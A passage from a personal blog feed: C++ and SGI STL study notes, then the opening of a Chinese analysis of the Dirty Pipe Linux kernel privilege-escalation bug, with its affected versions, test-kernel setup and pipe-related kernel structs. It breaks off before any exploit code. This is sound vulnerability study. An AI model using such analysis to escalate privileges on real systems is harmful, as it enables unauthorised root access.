class="headerlink" title="2.3 Type inference"></a>2.3 Type inference</h3><h4 id="auto-needless-to-say"><a href="#auto-needless-to-say" class="headerlink" title="auto : needless to say."></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#auto">auto</a> : <del>needless to say</del>.</h4><ul><li>Since C++ 20, <code>auto</code> can even be used as <strong>function arguments</strong>.</li></ul><h4 id="decltype"><a href="#decltype" class="headerlink" title="decltype :"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#decltype">decltype</a> :</h4><p>Its usage is very similar to <code>typeof</code> | <code>std::is_same&lt;T, U&gt;</code> </p><h4 id="tail-type-inference"><a href="#tail-type-inference" class="headerlink" title="tail type inference :"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#tail-type-inference">tail type inference</a> :</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//cpp 11+</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span> U&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add2</span><span class="hljs-params">(T x, U y)</span> -&gt; <span class="hljs-title">decltype</span><span class="hljs-params">(x+y)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><span class="hljs-comment">//cpp 14+</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span> U&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">add3</span><span class="hljs-params">(T x, U y)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> x + y;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="decltype-auto"><a href="#decltype-auto" class="headerlink" title="decltype(auto) :"></a><a href="https://changkun.de/modern-cpp/en-us/02-usability/#decltype-auto">decltype(auto)</a> :</h4><p>a slightly more complicated use of C++14. used to derive the return type of a forwarding function or package</p><h3 id="2-4-Control-flow"><a href="#2-4-Control-flow" class="headerlink" title="2.4 Control flow"></a>2.4 Control flow</h3><ul><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#if-constexpr">if constexpr</a> : C++17 <code>if constexpr (std::is_integral&lt;T&gt;::value) &#123;</code> put branch judgement in compile time. </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Range-based-for-loop">Range-based for loop</a> : <code>for (auto element : vec)</code> </li></ul><h3 id="2-5-Templates"><a href="#2-5-Templates" class="headerlink" title="2.5 Templates"></a>2.5 Templates</h3><ul><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Extern-templates">Extern templates</a> :  C++11 tell the compiler not to trigger the instantiation of the template.<br>  <code>extern template class std::vector&lt;double&gt;; // should not instantiation in current file</code> </p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#The-quot-gt-quot">The “&gt;”</a> : 也就是<code>&gt;&gt;</code>的编译问题</p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Type-alias-templates">Type alias templates</a> : C++11 typedef now can define a new name for template(the following <code>vector&lt;T&gt;</code>)<br>  <code>using TrueDarkMagic = MagicType&lt;std::vector&lt;T&gt;, std::string&gt;;</code> </p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Variadic-templates">Variadic templates</a> :  C++11 和 if constexp配套使用. 还有一些细节点击链接. </p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Fold-expression">Fold expression</a> : ?</p></li><li><p><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Non-type-template-parameter-deduction">Non-type template parameter deduction</a> : </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//after cpp 11</span><br><span class="hljs-keyword">buffer_t</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-number">100</span>&gt; buf; <span class="hljs-comment">// 100 as template parameter, `template &lt;class T, int BufSize&gt;`</span><br><span class="hljs-comment">//after cpp 17</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">auto</span> value&gt; <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>&#123;<br>    std::cout &lt;&lt; value &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">int</span> tmp = foo&lt;<span class="hljs-number">10</span>&gt;();<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="2-6-Object-oriented"><a href="#2-6-Object-oriented" class="headerlink" title="2.6 Object-oriented"></a>2.6 Object-oriented</h3><ul><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Delegate-constructor">委托构造Delegate constructor</a> : allows a constructor to call another constructor in a constructor in the same class. </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Inheritance-constructor">Inheritance constructor</a> : 继承构造 C++11 思维导图已经记过了. </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Explicit-virtual-function-overwrite">Explicit virtual function overwrite</a> : ….</li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#override">override</a> : self-evident </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#final">final</a> : can’t be override and derived</li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Explicit-delete-default-function">Explicit delete default function</a> : </li><li><a href="https://changkun.de/modern-cpp/en-us/02-usability/#Strongly-typed-enumerations">Strongly typed enumerations</a> : <code>enum class [enum_name] : type &#123; ... &#125;;</code> </li></ul><h2 id="Chapter-03-Language-Runtime-Enhancements"><a href="#Chapter-03-Language-Runtime-Enhancements" class="headerlink" title="Chapter 03: Language Runtime Enhancements"></a>Chapter 03: Language Runtime Enhancements</h2><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#3-1-Lambda-Expression">3.1 Lambda Expression</a> </p><ul><li><ul><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Basics">Basics</a> : C++14 expr capture?</li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Generic-Lambda">Generic Lambda</a> : C++14 use auto in parameter list. </li></ul></li></ul><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#3-2-Function-Object-Wrapper">3.2 Function Object Wrapper</a> </p><ul><li><ul><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#std-function">std::function</a> : </li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#std-bind-and-std-placeholder">std::bind and std::placeholder</a> : </li></ul></li></ul><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#3-3-rvalue-Reference">3.3 rvalue Reference</a></p><ul><li><ul><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#lvalue-rvalue-prvalue-xvalue">lvalue, rvalue, prvalue, xvalue</a> <ul><li>pure rvalue就是传统cpp的右值, 而将亡值(expire value)是指函数返回值那样的东西, C++11之后会使用一个效果等同于隐式转换的操作来将返回值变成一个右值. 实际上通过反编译可以看出函数<strong>多传入了上级栈帧的一个临时变量</strong>作为返回值的接收者, rax逻辑上没有存任何东西. 如果在新变量定义阶段接收这样的返回值, 那么这个新变量就是上面的临时变量. </li></ul></li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#rvalue-reference-and-lvalue-reference">rvalue reference and lvalue reference</a> : 有些细节, 不过不写代码也没必要知道. </li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Move-semantics">Move semantics</a> : <ul><li>说的花里胡哨, 什么延长了生存周期, 其实就是多了个参数. 只要记住: <strong>将亡值是一个右值</strong> </li><li><code>v.push_back(std::move(str));</code> 这一句完全不知道哪里清空的str, 反编译没看明白. 记着逻辑上清空了就完了. </li></ul></li><li><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Perfect-forwarding">Perfect forwarding</a> : <a href="https://stackoverflow.com/questions/8526598#answer-8527373">https://stackoverflow.com/questions/8526598#answer-8527373</a><ul><li>右值引用的变量本身是左值</li><li>对于左右值引用<strong>的引用</strong>来说适用于reference collapse. 之前是不允许这样的操作的. </li><li>在模板函数参数中使用右值引用, 然后<ul><li>当传入左值时模板参数自动推导成左值引用, 使用上面的规则得到右值引用的左值引用为左值引用. 这个变量确实也是左值, forward其实无作用</li><li>传入右值时还是右值引用, 但是变量本身是左值, 需要forward成右值保持不变. </li></ul></li><li>所以使用右值引用做函数参数, 加上个forward就解决了两种情况. </li></ul></li></ul></li></ul><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Conclusion">Conclusion</a></p><p><a href="https://changkun.de/modern-cpp/en-us/03-runtime/#Further-Readings">Further Readings</a> </p><h2 id="看了半天都写不全-还是cppreference吧"><a href="#看了半天都写不全-还是cppreference吧" class="headerlink" title="看了半天都写不全, 还是cppreference吧"></a>看了半天都写不全, 还是cppreference吧</h2><p><a href="https://en.cppreference.com/w/cpp/11">C++ 11的全部新特性</a>, <a href="https://en.cppreference.com/w/cpp/14">Cpp14</a>, <a href="https://en.cppreference.com/w/cpp/17">Cpp17</a>, <a href="https://en.cppreference.com/w/cpp/20">Cpp20</a>.</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>除了语言特性还看到了一些有趣的东西. 比如 ratio library, Concurrency support library等等</p><ul><li>user-defined literal</li><li>attributes</li><li>noexcept : <ul><li>If a function modified with <code>noexcept</code> is thrown, the compiler will use <code>std::terminate()</code> to immediately terminate the program. </li><li> can also be used as an operator to manipulate an expression</li><li><code>noexcept</code> 修饰完一个函数之后能够起到封锁异常扩散的功效，如果内部产生异常，外部也不会触发</li></ul></li><li></li></ul><hr><h1 id="SGI-STL-Src"><a href="#SGI-STL-Src" class="headerlink" title="SGI STL Src"></a>SGI STL Src</h1><p>书中源码: <a href="https://github.com/yogdzewa/STLSourceCodeNote">https://github.com/yogdzewa/STLSourceCodeNote</a> (更全) </p><p>标题为别人的笔记, 感觉没必要再做一个. </p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>六大组件</p><ul><li>containers</li><li>algorithms</li><li>iterators</li><li>functors(仿函数)</li><li>adapters(配接器)</li><li>allocators(配置器)</li></ul><img src="../../image/CXX_Correlative/image-20230121184607672.png" alt="image-20230121184607672" style="zoom:80%;" /><h2 id="allocator"><a href="#allocator" class="headerlink" title="allocator"></a><a href="https://github.com/steveLauwh/SGI-STL/tree/master/The%20Annotated%20STL%20Sources%20V3.3/allocator">allocator</a></h2><ul><li>为了精密分工， STL allocator 决定将这两阶段操作区分开来。 内存配置操作由 alloc:allocate () 负责， 内存释放操作由 alloc: :deallocate() 负责；对象构造操作由 : : construct() 负责，对象析构操作由 : : destroy() 负责。</li><li><img src="../../image/CXX_Correlative/image-20230121190308943.png" alt="image-20230121190308943" style="zoom:80%;" /></li><li> SGI 正是以 malloc(）和 free() 完成内存的配置与释放。</li><li><img src="../../image/CXX_Correlative/image-20230121233157488.png" alt="image-20230121233157488" style="zoom:80%;" /></li></ul><img src="../../image/CXX_Correlative/image-20230121233222146.png" alt="image-20230121233222146" style="zoom:80%;" /><ul><li>感觉没啥特别的, gcc源码一看是用的<code>std::allocator</code>, 和这里好像不太一样, 暂时跳过</li></ul><h2 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a><a href="https://github.com/steveLauwh/SGI-STL/tree/master/The%20Annotated%20STL%20Sources%20V3.3/iterator">iterator</a></h2><ul><li><img src="../../image/CXX_Correlative/image-20230123113720206.png" alt="image-20230123113720206"></li></ul><h2 id="associative-container"><a href="#associative-container" class="headerlink" title="associative container"></a><strong><a href="https://github.com/steveLauwh/SGI-STL/tree/master/The%20Annotated%20STL%20Sources%20V3.3/container/associative%20container">associative container</a></strong></h2><p>书中先讲了红黑树, 然后是各种关联式容器的介绍. </p>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language - 源码分析 - C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dirtypipe漏洞分析</title>
    <link href="/2022-11/CVE-dirtypipe/"/>
    <url>/2022-11/CVE-dirtypipe/</url>
    
    <content type="html"><![CDATA[<p>基本参考 –&gt; <a href="https://kiprey.github.io/2022/04/dirty-pipe">kp</a> &lt;–</p><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>Dirty Pipe 漏洞是 Linux 系统中的一个内核提权漏洞，漏洞危害堪比 Dirty COW，但相对于 Dirty COW 来说更加容易利用。</p><p>漏洞影响范围：<a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit</a> （v5.8-rc1） ~ <a href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">lib/iov_iter: initialize “flags” in new pipe_buffer</a>（v5.17-rc6）</p><p>时间范围大概是 2020/5/21 - 2022/2/21。</p><h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><p>在github上直接下载f6dd97版本, 借用了pwn.college的<a href="https://github.com/pwncollege/pwnkernel">脚本</a>. 然后内核编译设置借鉴kp的<a href="https://kiprey.github.io/2022/04/dirty-pipe/#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">blog</a>. </p><p>编译遇到的额外问题:</p><ul><li><p>经典的<a href="https://www.spinics.net/lists/kernel/msg3797871.html">thunk.o</a>, 已经遇到过了. </p></li><li><p>然后又来个新活, 打了又一个<a href="https://lore.kernel.org/all/9a9cae7fcf628843aabe5a086b1a3c5bf50f42e8.1585761021.git.jpoimboe@redhat.com/">patch</a>. 真找了半天.  </p><img src="../../image/dirtypipe/image-20221109224329290.png" alt="image-20221109224329290" style="zoom:80%;" /></li><li><p>然后又装了个<a href="https://src.fedoraproject.org/rpms/dwarves#:~:text=dwarves%20is%20a%20set%20of,recent%20ones%20such%20as%20systemtap.">dwarves</a>, 因为<code>BTF: .tmp_vmlinux.btf: pahole (pahole) is not available</code> </p></li></ul><h3 id="三-代码浅析"><a href="#三-代码浅析" class="headerlink" title="三. 代码浅析"></a>三. 代码浅析</h3><blockquote><p>pipe相关函数<a href="https://www.kernel.org/doc/html/latest/filesystems/splice.html#c.pipe_buffer">接口</a>(无源码, kernel doc) </p></blockquote><h4 id="read-amp-write"><a href="#read-amp-write" class="headerlink" title="read&amp;write"></a>read&amp;write</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>    .open             = fifo_open,<br>    .llseek           = no_llseek,<br>    .read_iter        = pipe_read,     <span class="hljs-comment">// read</span><br>    .write_iter       = pipe_write,    <span class="hljs-comment">// write</span><br>    .poll             = pipe_poll,<br>    .unlocked_ioctl   = pipe_ioctl,<br>    .release          = pipe_release,<br>    .fasync           = pipe_fasync,<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>read&amp;write函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_read</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *to)</span></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span><br></code></pre></div></td></tr></table></figure><p>只需简单知道：</p><ul><li><code>iocb</code>：中存放着获取当前 pipe 结构体的指针</li><li><code>from/to</code>：从管道读出来的数据将要写入的地方，iov_iter 迭代器类型。</li></ul><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><p><code>pipe_inode_info</code> 结构体存放了 pipe 机制所要用到的字段：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *  @mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *  @rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *  @wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *  @head: The point of buffer production</span><br><span class="hljs-comment"> *  @tail: The point of buffer consumption</span><br><span class="hljs-comment"> *  @max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *  @ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *  @tmp_page: cached released page</span><br><span class="hljs-comment"> *  @readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *  @writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *  @files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *  @r_counter: reader counter</span><br><span class="hljs-comment"> *  @w_counter: writer counter</span><br><span class="hljs-comment"> *  @fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *  @fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *  @bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *  @user: the user who created this pipe</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>    <span class="hljs-keyword">wait_queue_head_t</span> rd_wait, wr_wait;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> max_usage;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ring_size;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> readers;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> writers;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> files;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> r_counter;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> w_counter;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>pipe 存放数据使用的是<strong>环形队列</strong>，即在定长大小的数据环（pipe buf ring）上，尽可能的存储数据. </p><ul><li><code>head</code>：标注队列首部的<strong>索引</strong>，<strong>head 为接下来要写入的位置</strong>。</li><li><code>tail</code>：标注队列尾部的索引，<strong>tail 为接下来要读取的位置</strong>。</li></ul><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><p>该结构体存放着实际管道中存放的数据：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *  @page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *  @offset: offset of data inside the @page</span><br><span class="hljs-comment"> *  @len: length of data inside the @page</span><br><span class="hljs-comment"> *  @ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *  @flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *  @private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> offset, len;<br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">private</span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这个结构体存放了包括页引用、页偏移、数据大小等关键信息。这里的 flag 共有这几种：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/pipe_fs_i.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01    <span class="hljs-comment">/* page is on the LRU */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02    <span class="hljs-comment">/* was atomically mapped */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04    <span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08    <span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10    <span class="hljs-comment">/* can merge buffers */</span></span><br></code></pre></div></td></tr></table></figure><p>我们可以暂时不用去管这几种 flag 具体的意思。</p><h4 id="iov-iter"><a href="#iov-iter" class="headerlink" title="iov_iter"></a>iov_iter</h4><p>结构体 iov_iter 用于<strong>迭代</strong>那种<strong>被分为多个页的数据</strong>，换句话说，该结构体将用于迭代一个个页面。其结构体如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">iter_type</span> &#123;</span><br>    <span class="hljs-comment">/* iter types */</span><br>    ITER_IOVEC = <span class="hljs-number">4</span>,<br>    ITER_KVEC = <span class="hljs-number">8</span>,<br>    ITER_BVEC = <span class="hljs-number">16</span>,<br>    ITER_PIPE = <span class="hljs-number">32</span>,    <span class="hljs-comment">// 表示正在迭代的数据是位于 pipe 中的</span><br>    ITER_DISCARD = <span class="hljs-number">64</span>,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Bit 0 is the read/write bit, set if we&#x27;re writing.</span><br><span class="hljs-comment">     * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span><br><span class="hljs-comment">     * the caller isn&#x27;t expecting to drop a page reference when done.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> type;<br>    <span class="hljs-keyword">size_t</span> iov_offset;<br>    <span class="hljs-keyword">size_t</span> count;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">iov</span>;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvec</span> *<span class="hljs-title">kvec</span>;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span> *<span class="hljs-title">bvec</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> nr_segs;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> start_head;<br>        &#125;;<br>    &#125;;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>其中，一些字段的意义如下：</p><ul><li><p><code>type</code>：表示当前迭代的数据是来自于什么结构，例如：</p><ul><li>ITER_PIPE 表示当前迭代的数据为某个 pipe 中的页数据</li><li>ITER_DISCARD 表示写入当前 iov_iter 的数据全部丢弃。</li><li><code>ITER_KVEC</code> do almost the same, but with data in <strong>kernel</strong> space, </li><li><code>ITER_BVEC</code> to work with parts of memory mapped pages.</li></ul><p>后续针对 iov_iter 做内存读写时，会根据这个 type 来执行不同类型的内存读写操作。</p></li><li><p><code>iov_offset</code>：当前所迭代到 page 的相对偏移，读写将从该 page 的这个相对偏移开始。</p></li><li><p><code>cout</code>：可读写的数组字节大小</p></li></ul><h4 id="pipe-read相关调用结构"><a href="#pipe-read相关调用结构" class="headerlink" title="pipe_read相关调用结构"></a>pipe_read相关调用结构</h4><pre><code class=" mermaid">flowchart TBs[&quot;pipe_read(pipe-&gt;iter)&quot;] --&gt; copy_page_to_itercopy_page_to_iter --&gt;|iter KVEC+BVEC| copy_to_itercopy_page_to_iter --&gt;|ITER_PIPE| copy_page_to_iter_pipecopy_page_to_iter --&gt;|other type| copy_page_to_iter_ioveccopy_to_iter --&gt; _copy_to_iter_copy_to_iter --&gt;|iter is pipe| copy_pipe_to_iter_copy_to_iter --&gt;|other| iterate_and_advance???other_callpoint --&gt;|with iov_iter is pipe| copy_to_itercopy_pipe_to_iter --&gt; push_pipecopy_pipe_to_iter --&gt; 